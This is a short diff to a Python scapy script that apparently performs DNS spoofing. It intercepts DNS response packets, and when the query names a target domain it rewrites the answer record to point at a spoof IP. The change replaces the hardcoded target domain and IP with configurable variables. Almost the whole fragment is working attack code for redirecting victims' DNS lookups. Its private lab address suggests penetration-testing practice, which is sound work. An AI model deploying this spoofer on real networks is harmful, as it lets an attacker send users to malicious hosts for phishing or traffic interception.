@@ -17,9 +17,9 @@ def process_packet(packet):
     scapy_packet = IP(packet.get_payload())
     if scapy_packet.haslayer(DNSRR):
         qname = scapy_packet[DNSQR].qname
-        if "www.pentest-standard.org" in qname:
+        if target_dn in qname:
             print("[+] Spoofing Target: " + qname)
-            answer = DNSRR(rrname=qname, rdata="192.168.63.139")
+            answer = DNSRR(rrname=qname, rdata=spoof_ip)
             scapy_packet[DNS].an = answer
             scapy_packet[DNS].ancount = 1
 
